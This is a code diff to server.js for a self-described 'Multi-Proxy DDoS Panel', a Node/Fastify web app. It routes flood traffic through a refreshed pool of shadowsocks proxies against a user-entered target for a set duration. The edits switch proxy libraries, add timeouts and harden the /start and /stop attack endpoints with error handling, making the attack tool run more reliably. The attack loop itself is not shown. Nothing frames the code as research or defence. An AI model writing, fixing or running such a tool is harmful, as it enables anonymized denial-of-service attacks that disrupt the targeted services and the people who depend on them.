@@ -1,7 +1,17 @@
-// server.js - Multi-Proxy DDoS Panel with 15‑min proxy refresh
+// server.js - Multi-Proxy DDoS Panel with 15‑min proxy refresh (shadowsocks-libev)
 const fastify = require('fastify')({ logger: false });
+
+// Load Shadowsocks library – will crash on startup if missing
+let ss;
+try {
+    ss = require('shadowsocks-libev');
+    console.log('✅ Shadowsocks-libev loaded');
+} catch (e) {
+    console.error('❌ Failed to load shadowsocks-libev:', e.message);
+    process.exit(1);
+}
+
 const { SocksProxyAgent } = require('socks-proxy-agent');
-const ss = require('shadowsocks');
 const axios = require('axios');
 
 // ========== CONFIGURATION ==========
@@ -40,7 +50,7 @@ function parseSS(url) {
 async function fetchProxyConfigs() {
     try {
         console.log('Fetching proxy list...');
-        const response = await axios.get(PROXY_LIST_URL);
+        const response = await axios.get(PROXY_LIST_URL, { timeout: 10000 });
         const lines = response.data.split('\n');
         const configs = [];
         for (const line of lines) {
@@ -59,15 +69,19 @@ async function fetchProxyConfigs() {
 
 async function startProxyServer(config, localPort) {
     return new Promise((resolve, reject) => {
-        const server = ss.createServer(config);
-        server.listen(localPort, '127.0.0.1', (err) => {
-            if (err) return reject(err);
-            console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
-            resolve(server);
-        });
-        server.on('error', (err) => {
-            console.error(`❌ Proxy ${localPort} error:`, err.message);
-        });
+        try {
+            const server = ss.createServer(config);
+            server.listen(localPort, '127.0.0.1', (err) => {
+                if (err) return reject(err);
+                console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
+                resolve(server);
+            });
+            server.on('error', (err) => {
+                console.error(`❌ Proxy ${localPort} error:`, err.message);
+            });
+        } catch (err) {
+            reject(err);
+        }
     });
 }
 
@@ -226,7 +240,15 @@ const html = `
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ target, duration })
                 });
-                const data = await res.json();
+                // Always try to parse JSON, but if fails, show response text
+                let data;
+                const contentType = res.headers.get('content-type');
+                if (contentType && contentType.includes('application/json')) {
+                    data = await res.json();
+                } else {
+                    const text = await res.text();
+                    throw new Error(`Server returned non-JSON: ${text.substring(0,100)}`);
+                }
                 if (!data.success) {
                     alert('Error: ' + data.error);
                 } else {
@@ -274,43 +296,59 @@ fastify.get('/status', (req, reply) => {
 });
 
 fastify.post('/start', async (req, reply) => {
-    const { target, duration } = req.body;
-    if (!target || !duration) {
-        return reply.status(400).send({ success: false, error: 'Missing target or duration' });
+    try {
+        const { target, duration } = req.body;
+        if (!target || !duration) {
+            return reply.status(400).send({ success: false, error: 'Missing target or duration' });
+        }
+
+        // Stop any ongoing attack
+        attackActive = false;
+        await stopProxyPool();
+
+        // Ensure we have proxies
+        if (proxyConfigs.length === 0) {
+            proxyConfigs = await fetchProxyConfigs();
+        }
+        if (proxyConfigs.length === 0) {
+            return reply.status(500).send({ success: false, error: 'No proxies available' });
+        }
+
+        // Start proxy pool
+        const started = await startProxyPool();
+        if (!started) {
+            return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
+        }
+
+        // Reset stats and start attack
+        attackStats = { requests: 0, errors: 0 };
+        attackActive = true;
+
+        // Run attack asynchronously
+        runAttack(target, duration).catch(console.error);
+
+        reply.send({ success: true });
+    } catch (err) {
+        console.error('Unhandled error in /start:', err);
+        reply.status(500).send({ success: false, error: err.message });
     }
-
-    // Stop any ongoing attack
-    attackActive = false;
-    await stopProxyPool();
-
-    // Ensure we have proxies (should already have from init)
-    if (proxyConfigs.length === 0) {
-        proxyConfigs = await fetchProxyConfigs();
-    }
-    if (proxyConfigs.length === 0) {
-        return reply.status(500).send({ success: false, error: 'No proxies available' });
-    }
-
-    // Start proxy pool
-    const started = await startProxyPool();
-    if (!started) {
-        return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
-    }
-
-    // Reset stats and start attack
-    attackStats = { requests: 0, errors: 0 };
-    attackActive = true;
-
-    // Run attack asynchronously
-    runAttack(target, duration).catch(console.error);
-
-    reply.send({ success: true });
 });
 
 fastify.post('/stop', async (req, reply) => {
-    attackActive = false;
-    await stopProxyPool();
-    reply.send({ success: true });
+    try {
+        attackActive = false;
+        await stopProxyPool();
+        reply.send({ success: true });
+    } catch (err) {
+        console.error('Unhandled error in /stop:', err);
+        reply.status(500).send({ success: false, error: err.message });
+    }
+});
+
+// Global error handler for Fastify
+fastify.setErrorHandler((error, request, reply) => {
+    console.error('Fastify error:', error);
+    reply.status(500).send({ success: false, error: error.message });
 });
 
 // ========== INIT ==========
